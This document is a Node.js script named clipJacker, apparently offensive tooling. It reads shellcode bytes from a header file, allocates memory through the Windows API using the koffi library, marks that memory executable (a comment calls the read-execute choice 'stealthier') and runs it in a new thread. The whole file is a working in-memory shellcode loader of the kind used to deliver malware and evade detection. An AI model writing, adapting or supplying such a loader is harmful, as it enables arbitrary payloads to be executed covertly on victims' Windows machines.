'use strict';

const fs = require('fs').promises;
const koffi = require('koffi');

async function clipJacker(filePath) {
  // ── CONFIG ───────────────────────────────────────────────
  const SHELLCODE_FILE = filePath || './bytes.h';

  console.log(`[+] Reading shellcode from file: ${SHELLCODE_FILE}`);

  // 1. Read the file content (should contain \xAA\xBB... style C header)
  let rawContent;
  try {
    rawContent = await fs.readFile(SHELLCODE_FILE, 'utf8');
  } catch (err) {
    throw new Error(`Failed to read file ${SHELLCODE_FILE}: ${err.message}`);
  }

  // 2. Parse shellcode from C header string
  function parseShellcodeFromString(content) {
    const matches = [...content.matchAll(/\\x([0-9a-fA-F]{2})/gi)];
    
    if (matches.length === 0) {
      throw new Error('No \\xNN byte patterns found in the file');
    }

    const bytes = matches.map(m => parseInt(m[1], 16));
    const buffer = Buffer.from(bytes);

    console.log(`[+] Successfully parsed ${buffer.length} shellcode bytes`);
    return buffer;
  }

  const shellcode = parseShellcodeFromString(rawContent);
  const size = shellcode.length;

  const kernel32 = koffi.load('kernel32.dll');

  const VirtualAlloc = kernel32.func(
    'void * __stdcall VirtualAlloc(void * lpAddress, size_t dwSize, uint32_t flAllocationType, uint32_t flProtect)'
  );

  const VirtualProtect = kernel32.func(
    'bool __stdcall VirtualProtect(void * lpAddress, size_t dwSize, uint32_t flNewProtect, uint32_t * lpflOldProtect)'
  );

  const RtlCopyMemory = kernel32.func(
    'void __stdcall RtlCopyMemory(void * Destination, const void * Source, size_t Length)'
  );

  const CreateThread = kernel32.func(
    'void * __stdcall CreateThread(void * lpThreadAttributes, size_t dwStackSize, void * lpStartAddress, void * lpParameter, uint32_t dwCreationFlags, uint32_t * lpThreadId)'
  );

  const WaitForSingleObject = kernel32.func(
    'uint32_t __stdcall WaitForSingleObject(void * hHandle, uint32_t dwMilliseconds)'
  );

  // Constants
  const MEM_COMMIT              = 0x1000;
  const MEM_RESERVE             = 0x2000;
  const PAGE_READWRITE          = 0x04;
  const PAGE_EXECUTE_READ       = 0x20;
  const PAGE_EXECUTE_READWRITE  = 0x40;
  const INFINITE                = 0xFFFFFFFF;

  // 3. Allocate RW memory
  const addr = VirtualAlloc(null, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!addr) throw new Error('VirtualAlloc failed');

  console.log('[+] Memory allocated at:', addr);

  // 4. Copy shellcode
  RtlCopyMemory(addr, shellcode, size);
  console.log('[+] Shellcode copied into allocated memory');

  // 5. Try RX first (stealthier), fallback to RWX
  const oldProtect = Buffer.alloc(4);
  let success = VirtualProtect(addr, size, PAGE_EXECUTE_READ, oldProtect);

  if (!success) {
    console.warn('[-] PAGE_EXECUTE_READ failed → falling back to RWX');
    success = VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, oldProtect);
    if (!success) throw new Error('VirtualProtect failed');
    console.log('[+] Protection changed to RWX');
  } else {
    console.log('[+] Protection changed to RX');
  }

  // 6. Execute in new thread
  console.log('[+] Launching shellcode thread...');
  const threadIdBuf = Buffer.alloc(4);
  const thread = CreateThread(null, 0, addr, null, 0, threadIdBuf);

  if (!thread) throw new Error('CreateThread failed');

  console.log('[+] Thread created (ID:', threadIdBuf.readUInt32LE(0), ')');

  // Wait for thread completion (blocks forever if shellcode doesn't exit)
  await WaitForSingleObject(thread, INFINITE);
  console.log('[✓] Shellcode execution finished');
}


const args = process.argv.slice(2);
if (args.length > 0) {
  clipJacker(args[0]).catch(err => {
    console.error('Error:', err.message);
    process.exit(1);
  });
} else {
  // Default fallback
  clipJacker().catch(err => {
    console.error('Error:', err.message);
    process.exit(1);
  });

}
